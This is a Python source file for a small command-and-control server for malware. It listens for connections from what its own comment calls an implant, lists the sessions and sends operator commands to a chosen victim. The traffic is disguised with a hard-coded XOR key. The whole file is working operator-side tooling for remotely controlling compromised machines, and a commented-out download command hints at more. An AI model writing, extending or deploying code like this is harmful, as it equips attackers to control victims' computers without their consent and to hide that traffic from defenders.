import socket
import struct
import threading
import time


clients = {}
lock = threading.Lock()
key = b'Hello02World0d'  # Traffic encryption key. Corresponding to the security in the contents of the implant file

def enc_xor(data,key):
    key_size = len(key)
    return bytes(data_byte ^ key[i % key_size] for i ,data_byte in enumerate(data))
    


def send_msg(sock, msg):
    
    try:
        encoded_msg = enc_xor(msg.encode(),key)
        sock.send(encoded_msg)
    except Exception as e:
        print(f"Failed to send message: {e}")
        raise

def recv_msg(sock):
    
    try:
        data = enc_xor(sock.recv(4096),key)
        return data.decode('utf-8', errors='ignore')
        
    except Exception as e:
        print(f"Failed to receive message: {e}")
        return None





def handle_client(client_sock, client_addr):
    
    print(f"\nClient {client_addr} has connected\n")
    print("Enter 'choice' to select a client, 'exit' to quit the program, or 'sessions' to refresh the session list")
    
    try:
        while True:
            
            decoded_msg = recv_msg(client_sock)
            if decoded_msg is None:
                print(f"Connection with client {client_addr} has been disconnected.")
                break
            
            else:
            
                print(f"Received message from {client_addr}:\n {decoded_msg}")
    finally:
        
        with lock:
            del clients[client_addr]
        client_sock.close()
        print(f"Client {client_addr} has disconnected")

def server_loop():
    
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 12345))  
    server_socket.listen(5)  
    print("Server started, waiting for client connections... (type 'exit' to quit)")

    while True:
       
        client_sock, client_addr = server_socket.accept()
        
       
        with lock:
            clients[client_addr] = client_sock
        
        
        client_thread = threading.Thread(target=handle_client, args=(client_sock, client_addr))
        client_thread.daemon = True
        client_thread.start()

def check_clients():
    if not clients:
        print("No clients connected")
        return
    for i ,addr in enumerate(clients.keys()):
        print(f"{i + 1}.{addr}")
        



def send_to_clients():
    
    while True:
        
        with lock:
            check_clients()
        
        
        
        choice = input("Please enter the client number you want to send a message to (type 'back' to go back): ")
        if choice.lower() == 'back':
            print("Returning to main menu...")
            print("Input 'exit' to quit or 'choice' to re-enter, 'sessions' to refresh clients")
            break
        # elif choice.lower() == 'refresh':
            # check_clients()
            # break
        
        try:
            choice_idx = int(choice) - 1
            if choice_idx < 0 or choice_idx >= len(clients):
                print("Invalid number, please try again.")
                continue
            
            
            target_addr = list(clients.keys())[choice_idx]
            target_sock = clients[target_addr]
            
           
            while True:
                
                message = input(f"Enter message to send to {target_addr} (type 'back' to go back):\n")
                if message.lower() == 'back':
                    print("Going back...")
                    
                    break
                
                
                    
                else:
                    
                    send_msg(target_sock, message)
                    print(f"Message sent to {target_addr}: {message}")   
                    
                
        
        except ValueError:
            print("Invalid input. Please enter a numeric index.")

if __name__ == "__main__":
    
    server_thread = threading.Thread(target=server_loop)
    server_thread.daemon = True
    server_thread.start()
    print('******************')
    
    
    while True:
        command = input("").lower()
        if command == 'exit':
            print("Exiting program...")
            break
        elif command == 'sessions':
            check_clients()
            
        elif command == 'choice':
            send_to_clients()
            
        # elif command == 'download':
            # send_download_command()
        else:
            print("Invalid command. Please type 'choice', 'sessions', or 'exit'.")